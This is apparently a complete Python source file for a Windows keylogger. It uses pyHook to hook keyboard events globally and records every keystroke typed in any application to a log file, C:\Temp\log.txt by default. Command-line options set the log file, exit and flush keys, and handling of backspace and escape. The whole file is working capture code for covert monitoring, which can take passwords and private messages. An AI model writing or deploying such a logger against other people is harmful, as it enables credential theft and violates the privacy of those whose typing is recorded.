import pyHook
import time
import pythoncom
import sys
from optparse import OptionParser
import traceback


class KeyLogger:
    ''' Captures all keystrokes, and logs them to a text file
    '''
    def __init__(self): 
        
        self.ParseOptions()
        
        '''
        self.exitKey = exitKey                      #key we press to quit keylogger
        self.flushKey = flushKey                    #key we press to make keylogger flush the file buffer (so we can check the log, for example)
        self.parseBackspace = parseBackspace
        self.parseEscape = parseEscape
        self.addLineFeed = addLineFeed
        self.debug = debug
        '''
        self.hm = pyHook.HookManager()
    
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.options.hookKeyboard == True:
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        if self.options.debug == False:
            self.log = open(self.options.filename, 'a')            
        
        #ascii subset is created as a filter to exclude funky non-printable chars from the log
        self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        self.asciiSubset.extend(range(32,128))      #all normal printable chars
        
        if self.options.parseBackspace == True:
            self.asciiSubset.remove(8)              #remove backspace from allowed chars if needed
        if self.options.parseEscape == True:
            self.asciiSubset.remove(27)             #remove escape from allowed chars if needed
        
        pythoncom.PumpMessages()
            

    def OnKeyboardEvent(self, event):
        '''This function actually writes the stuff to the log, subject to parsing.
        '''
        '''
        self.log.write('MessageName: ' + str(event.MessageName))
        self.log.write('Message: ' + str(event.Message))
        self.log.write('Time: ' + str(event.Time))
        self.log.write('Window: ' + str(event.Window))
        self.log.write('WindowName: ' + str(event.WindowName))
        self.log.write('Ascii: ' + str(event.Ascii) + ' ' + chr(event.Ascii))
        self.log.write('Key: ' + str(event.Key))
        self.log.write('KeyID: ' + str(event.KeyID))
        self.log.write('ScanCode: ' + str(event.ScanCode))
        self.log.write('Extended: ' + str(event.Extended))
        self.log.write('Injected: ' + str(event.Injected))
        self.log.write('Alt: ' + str(event.Alt))
        self.log.write('Transition: ' + str(event.Transition))
        self.log.write('---\n')
        '''
        if event.Ascii in self.asciiSubset:
            self.PrintStuff(chr(event.Ascii))
        if event.Ascii == 13 and self.options.addLineFeed == True:
            self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift')):
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and self.options.parseBackspace == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and self.options.parseEscape == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        if event.Key == self.options.flushKey:
            self.log.flush()
        
        if event.Key == self.options.exitKey:
            sys.exit()
            
        return True
    def PrintStuff(self, stuff):
        if self.options.debug == False:
            self.log.write(stuff)
        else:
            sys.stdout.write(stuff)
    
    def ParseOptions(self):
        #usage = "usage: %prog [options] arg"
        parser = OptionParser(version="%prog version 0.3")
        parser.add_option("-f", "--file", action="store", dest="filename", help="write log data to FILENAME [default: %default]")
        parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input (default)")
        parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected [for Notepad compatibility]")
        parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string")
        parser.add_option("-e", "--parseescape", action="store_true", dest="parseEscape", help="translate escape chacarter into printable string")

        parser.add_option("-x", "--exitkey", action="store", dest="exitKey", help="specify the key to press to exit keylogger [default: %default]")
        parser.add_option("-l", "--flushkey", action="store", dest="flushKey", help="specify the key to press to flush write buffer to file [default: %default]")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file)")
                  
        parser.set_defaults(filename="C:\Temp\log.txt",
                            hookKeyboard=True,
                            addLineFeed=False,
                            parseBackspace=False,
                            parseEscape=False,
                            exitKey='F12',
                            flushKey='F11',
                            debug=False)

        (self.options, args) = parser.parse_args()
            
if __name__ == '__main__':
    kl = KeyLogger()
    
    #if you want to change keylogger behavior from defaults, run it with commandline options. try '-h' for list of options.
    